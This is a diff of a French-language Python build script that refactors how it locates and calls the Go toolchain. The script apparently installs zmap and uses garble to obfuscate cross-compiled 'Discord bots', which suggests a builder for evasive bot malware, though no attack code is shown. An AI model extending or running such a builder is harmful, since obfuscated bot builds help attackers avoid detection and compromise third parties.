@@ -74,6 +74,9 @@ def run(cmd: list, capture=False) -> tuple[int, str]:
     except FileNotFoundError:
         return 127, f"not found: {cmd[0]}"
 
+# ─── Global Go binary path ────────────────────────────────────────────────────
+_GO_BIN = shutil.which('go') or 'go'
+
 # ─── Dependency check ────────────────────────────────────────────────────────
 
 def check_and_install_deps():
@@ -102,7 +105,7 @@ def check_and_install_deps():
         else:
             cprint("  [!] Installez Go depuis https://go.dev/doc/install", C.RED)
     else:
-        r = subprocess.run(['go', 'version'], capture_output=True, text=True)
+        r = subprocess.run([_GO_BIN, 'version'], capture_output=True, text=True)
         ok.append(f"go {r.stdout.strip().split()[-1] if r.stdout else '?'}")
 
     # ── curl ────────────────────────────────────────────────────────────────
@@ -160,7 +163,7 @@ def check_and_install_deps():
     if not go116_path:
         if _have('go'):
             cprint("  [~] go1.16 absent — installation du downloader...", C.YELLOW)
-            subprocess.run(['go', 'install', 'golang.org/dl/go1.16@latest'],
+            subprocess.run([_GO_BIN, 'install', 'golang.org/dl/go1.16@latest'],
                            capture_output=True)
             # S'assurer que ~/go/bin est dans PATH pour trouver go1.16
             _gobin = str(Path.home() / 'go' / 'bin')
@@ -662,7 +665,7 @@ class Builder:
         cinput("  > Entrée pour continuer ou Ctrl+C pour annuler...")
         os.system("apt update -qq && apt install -y golang zmap")
         cprint("  [*] go mod tidy...", C.YELLOW)
-        run(['go', 'mod', 'tidy'])
+        run([_GO_BIN, 'mod', 'tidy'])
         cprint("  [+] Dépendances installées.", C.GREEN)
         cinput("  > Entrée...")
 
@@ -753,7 +756,7 @@ class Builder:
                 if gp.exists(): return str(gp)
             # 4. go env GOPATH
             try:
-                r = subprocess.run(['go', 'env', 'GOPATH'], capture_output=True, text=True)
+                r = subprocess.run([_GO_BIN, 'env', 'GOPATH'], capture_output=True, text=True)
                 if r.returncode == 0:
                     gp = Path(r.stdout.strip()) / 'bin' / 'garble'
                     if gp.exists(): return str(gp)
@@ -767,7 +770,7 @@ class Builder:
             cprint(f"  [+] garble détecté ({_garble_bin}) → build obfusqué", C.GREEN)
         else:
             cprint(f"\n  {C.YELLOW}[~] garble absent — installation automatique...{C.RESET}")
-            inst = subprocess.run(['go', 'install', 'mvdan.cc/garble@latest'],
+            inst = subprocess.run([_GO_BIN, 'install', 'mvdan.cc/garble@latest'],
                                   capture_output=True, text=True)
             if inst.returncode == 0:
                 _garble_bin = _find_garble()
@@ -785,9 +788,15 @@ class Builder:
                 if r != 'o':
                     cinput("  > Build annulé. Entrée..."); return
 
+        # Affiche Go détecté et sa version
+        _go_ver = subprocess.run([_GO_BIN, 'version'], capture_output=True, text=True)
+        _go_version_str = _go_ver.stdout.strip() if _go_ver.returncode == 0 else 'unknown'
+        cprint(f"\n  [*] Go détecté : {_GO_BIN}", C.CYAN)
+        cprint(f"      {_go_version_str}", C.CYAN)
+
         # 1. go mod tidy
-        cprint("\n  [*] go mod tidy...", C.YELLOW)
-        run(['go', 'mod', 'tidy'])
+        cprint(f"\n  [*] go mod tidy...", C.YELLOW)
+        run([_GO_BIN, 'mod', 'tidy'])
 
         # 2. Build bots Discord (cross-compile)
         Path(BUILD_DIR).mkdir(exist_ok=True)
@@ -803,7 +812,7 @@ class Builder:
             env_vars['CGO_ENABLED'] = '0'
             if _garble: env_vars['GOGARBLE'] = '*'
             env_vars.update(extra_env)
-            _go = _garble_bin if _garble else 'go'
+            _go = _garble_bin if _garble else _GO_BIN
             _args = ['-literals', '-tiny', '-seed=random'] if _garble else []
             cmd = [_go] + _args + ['build', f'-ldflags={ldflags_common}'] + _trimpath_flag + ['-o', out_name, 'bot_discord.go']
             try:
